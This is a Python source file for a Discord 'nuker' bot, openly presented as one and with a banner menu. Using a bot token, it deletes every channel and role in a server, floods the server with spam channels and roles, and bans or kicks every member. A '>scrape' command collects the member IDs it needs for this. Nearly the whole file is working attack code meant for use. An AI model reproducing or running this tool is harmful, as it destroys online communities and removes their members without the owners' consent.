import time
import threading
import os
import discord
import requests
from discord.ext import commands
from colorama import Fore
import json
#credit to other open source nukers for inspiration
#tell the creator how garbage he is at coding: chez#0358
#WARNING: spaghetti code ahead. Prepare for cringe. 
try:
    with open('config.json') as f:
        config = json.load(f)
except:
    print("You are missing the config file")
    time.sleep(10)
token = config["token"]
header = {"Authorization": "Bot "            + token}
intents = discord.Intents.all()
client = commands.Bot(command_prefix=">", intents=intents)
client.remove_command("help")
class CN:
    def nuke(channelid):
        while True:
            r = requests.delete(f"https://discord.com/api/channels/{channelid}", headers=header)
            if r.status_code == 204 or r.status_code == 201 or r.status_code == 200:
                print(f"{Fore.YELLOW}[{Fore.WHITE}>{Fore.YELLOW}]{Fore.GREEN} Succesfully deleted channel id {channelid}")
                break
            elif r.status_code == 429:
                print(f"{Fore.YELLOW}Rate limited")
                sleep_time = r.json()["retry_after"]
                sleep_time = int(sleep_time)/1000
                time.sleep(sleep_time)
                CN.nuke(channelid)
                break
            else:
                print(f"{Fore.YELLOW}[{Fore.WHITE}>{Fore.YELLOW}]{Fore.RED} Could not delete channel {channelid}")
                break
          
    def add(channel_name, guildid):
        json = {
            "name":channel_name,
            "type":0
        }
        while True:
            r = requests.post(f"https://discord.com/api/guilds/{guildid}/channels", headers=header, json=json)
            if r.status_code == 204 or r.status_code == 201 or r.status_code == 200:
                print(f"{Fore.YELLOW}[{Fore.WHITE}>{Fore.YELLOW}]{Fore.GREEN} Succesfully created channel {channel_name}")
                break
            elif r.status_code == 429:
                print(f"{Fore.YELLOW}[{Fore.WHITE}>{Fore.YELLOW}] Rate limited")
                sleep_time = r.json()["retry_after"]
                sleep_time = int(sleep_time)/1000
                time.sleep(sleep_time)
                CN.add(channel_name, guildid)
                break
            else:
                print(f"{Fore.YELLOW}[{Fore.WHITE}>{Fore.YELLOW}]{Fore.RED} Could not add channel {channel_name}" )
                break

    def ban(user, guildid):
        json = {
            "delete_message_days": 7,
            "reason": config["ban_reason"]
        }
        while True:
            r = requests.put(f"https://discord.com/api/guilds/{guildid}/bans/"+user, headers=header,json=json)
            if r.status_code == 204 or r.status_code == 201 or r.status_code == 200:
                print(f"{Fore.YELLOW}[{Fore.WHITE}>{Fore.YELLOW}]{Fore.GREEN} Succesfully banned user id {user}")
                break
            elif r.status_code == 429:
                print(f"{Fore.YELLOW}[{Fore.WHITE}>{Fore.YELLOW}] Rate limited")
                sleep_time = r.json()["retry_after"]
                sleep_time = int(sleep_time)/1000
                time.sleep(sleep_time)
                CN.ban(user, guildid)
                break
            else:
                print(f"{Fore.YELLOW}[{Fore.WHITE}>{Fore.YELLOW}]{Fore.RED} Could not ban user {user}")
                break

    def nukerole(role, guildid):
        while True:
            r = requests.delete(f"https://discord.com/api/guilds/{guildid}/roles/"+role, headers=header)
            if r.status_code == 204 or r.status_code == 201 or r.status_code == 200:
                print(f"{Fore.YELLOW}[{Fore.WHITE}>{Fore.YELLOW}]{Fore.GREEN} Succesfully deleted role {role}")
                break
            elif r.status_code == 429:
                print(f"{Fore.YELLOW}[{Fore.WHITE}>{Fore.YELLOW}] Rate limited")
                sleep_time = r.json()["retry_after"]
                sleep_time = int(sleep_time)/1000
                time.sleep(sleep_time)
                CN.nukerole(role, guildid)
                break
            else:
                print(f"{Fore.YELLOW}[{Fore.WHITE}>{Fore.YELLOW}]{Fore.RED} Could not delete role {role}")
                break

    def createroles(name, guildid):
        json = {
                'hoist': 'true',
                'name': name,
                'mentionable': 'true',
                'color': config["role_color"],
                'permissions': 1
            }
        while True:
            r = requests.post(f"https://discord.com/api/guilds/{guildid}/roles", headers=header, json=json)
            if r.status_code == 204 or r.status_code == 201 or r.status_code == 200:
                print(f"{Fore.YELLOW}[{Fore.WHITE}>{Fore.YELLOW}]{Fore.GREEN} Succesfully created role {name}")
                break
            elif r.status_code == 429:
                print(f"{Fore.YELLOW}[{Fore.WHITE}>{Fore.YELLOW}] Rate limited")
                sleep_time = r.json()["retry_after"]
                sleep_time = int(sleep_time)/1000
                time.sleep(sleep_time)
                CN.createroles(name, guildid)
                break
            else:
                print(f"{Fore.YELLOW}[{Fore.WHITE}>{Fore.YELLOW}]{Fore.RED} Could not create role {name}")
                break

    def kick(userid, guildid):
        while True:
            r = requests.delete(f"https://discord.com/api//guilds/{guildid}/members/"+ userid, headers=header)
            if r.status_code == 204 or r.status_code == 201 or r.status_code == 200:
                print(f"{Fore.YELLOW}[{Fore.WHITE}>{Fore.YELLOW}]{Fore.GREEN} Succesfully kicked user "+ userid)
                break
            elif r.status_code == 429:
                print(f"{Fore.YELLOW}[{Fore.WHITE}>{Fore.YELLOW}] Rate limited")
                sleep_time = r.json()["retry_after"]
                sleep_time = int(sleep_time)/1000
                time.sleep(sleep_time)
                CN.kick(userid, guildid)
                break
            else:
                print(f"{Fore.YELLOW}[{Fore.WHITE}>{Fore.YELLOW}]{Fore.RED} Could not kick user {userid}")
                break

    def scrape():
        print("type >scrape in any channel") 
    
    def exit():
        os._exit(0)

def guildid():
    guild_id = config["guildid"]
    return guild_id
guildid = guildid()

def main():
    try:
        clear = lambda: os.system('cls')
        clear()
    except:
        pass
    print(f"""{Fore.YELLOW}                 
                         ______     __  __     ______     ______     ______     ______    
                        /\  ___\   /\ \_\ \   /\  ___\   /\  ___\   /\  ___\   /\  ___\   
                        \ \ \____  \ \  __ \  \ \  __\   \ \  __\   \ \___  \  \ \  __\   
                         \ \_____\  \ \_\ \_\  \ \_____\  \ \_____\  \/\_____\  \ \_____\ 
                          \/_____/   \/_/\/_/   \/_____/   \/_____/   \/_____/   \/_____/ 
                                                                  
                                        >1.{Fore.WHITE}Nuke Channels {Fore.YELLOW}  >5.{Fore.WHITE}Spam Roles{Fore.YELLOW}
                                        >2.{Fore.WHITE}Spam Channels {Fore.YELLOW}  >6.{Fore.WHITE}Kick All{Fore.YELLOW}
                                        >3.{Fore.WHITE}Ban All      {Fore.YELLOW}   >7.{Fore.WHITE}Scrape{Fore.YELLOW}
                                        >4.{Fore.WHITE}Delete Roles  {Fore.YELLOW}  >8.{Fore.WHITE}Exit    {Fore.YELLOW} """)
    try:
        choice = input(f"{Fore.YELLOW}[{Fore.WHITE}>{Fore.YELLOW}]{Fore.WHITE} Choose An Option: ")
        choice = int(choice)
    except:
        print(f"{Fore.RED}Enter valid information")
        time.sleep(3)
        main()
    if choice == 1:
        channel_list = requests.get(f"https://discord.com/api/guilds/{guildid}/channels", headers=header)
        channel_list = channel_list.json()
        channel_ids = []
        for x in channel_list:
            channel_ids.append(x["id"])
        for y in channel_ids:
            thread = threading.Thread(target=CN.nuke, args=[y])
            thread.start()
        time.sleep(3)
        main()

    elif choice == 2:
        try:
            name = input(f"{Fore.YELLOW}[{Fore.WHITE}>{Fore.YELLOW}]{Fore.WHITE} Enter channel name: ")
            amount = input(f"{Fore.YELLOW}[{Fore.WHITE}>{Fore.YELLOW}]{Fore.WHITE} Enter amount: ")
        except:
            print(f"{Fore.RED}Enter valid information")
            time.sleep(3)
            main()
        try:
            amount = int(amount)
        except:
            print(f"{Fore.RED}Enter a valid number")
            time.sleep(3)
            main()
        for x in range(amount):
            thread = threading.Thread(target=CN.add, args=[name, guildid])
            thread.start()
        time.sleep(3)
        main()

    elif choice == 3:
        try:
            size = os.path.getsize("users.txt")
            if size > 0:
                pass
            else:
                print(f"{Fore.RED}You need to scrape before running this command")
                time.sleep(3)
                main()
        except:
            print(f"{Fore.RED}You need to scrape first before running this command")
            time.sleep(3)
            main()
        f = open("users.txt","r")
        for id in f:
            thread = threading.Thread(target=CN.ban, args=[id, guildid])
            thread.start()
        f.close()
        time.sleep(3)
        main()

    elif choice == 4:
        role_list = requests.get(f"https://discord.com/api/guilds/{guildid}/roles", headers=header)
        role_list = role_list.json()
        role_ids = []
        for x in role_list:
            role_ids.append(x["id"])
        for y in role_ids:
            thread = threading.Thread(target=CN.nukerole, args=[y, guildid])
            thread.start()
        time.sleep(3)
        main()

    elif choice == 5:
        try:
            name = input(f"{Fore.YELLOW}[{Fore.WHITE}>{Fore.YELLOW}]{Fore.WHITE} Enter role name: ")
            amount = input(f"{Fore.YELLOW}[{Fore.WHITE}>{Fore.YELLOW}]{Fore.WHITE} Enter amount: ")
        except:
            print(f"{Fore.RED}Enter valid information")
            time.sleep(3)
            main()
        try:
            amount = int(amount)
        except:
            print(f"{Fore.RED} Enter a valid number")
            time.sleep(3)
            main()
        for x in range(amount):
            thread = threading.Thread(target=CN.createroles, args=[name, guildid])
            thread.start()
        time.sleep(3)
        main()

    elif choice == 6:
        try:
            size = os.path.getsize("users.txt")
            if size > 0:
                pass
            else:
                print(f"{Fore.RED}You need to scrape first before running this command")
                time.sleep(3)
                main()
        except:
            print(f"{Fore.RED}You need to scrape first before running this command")
            time.sleep(3)
            main()
        f = open("users.txt","r")
        for id in f:
            thread = threading.Thread(target=CN.kick, args=[id, guildid])
            thread.start()
        f.close()
        time.sleep(3)
        main()

    elif choice == 7:
        CN.scrape()
        time.sleep(3)
        main()

    elif choice == 8:
        CN.exit()

    else:
        print(f"{Fore.YELLOW}[{Fore.WHITE}>{Fore.YELLOW}]{Fore.RED} Enter a valid option")
        time.sleep(3)
        main()

@client.command()
async def scrape(ctx):
    await ctx.message.delete()
    try:
        os.remove("users.txt")
    except:
        pass
    members = 0
    with open('users.txt', 'w') as f: 
        for member in ctx.guild.members:
            f.write(str(member.id)+"\n") 
            members = members+1
    f.close()

print("Loading...")

@client.event
async def on_ready():
    main_thread = threading.Thread(target=main)
    main_thread.start()
try:
    client.run(token)
except:
    print(f"{Fore.RED}Invalid Token, check that you have it entered correctly or reset the token.")
    time.sleep(10)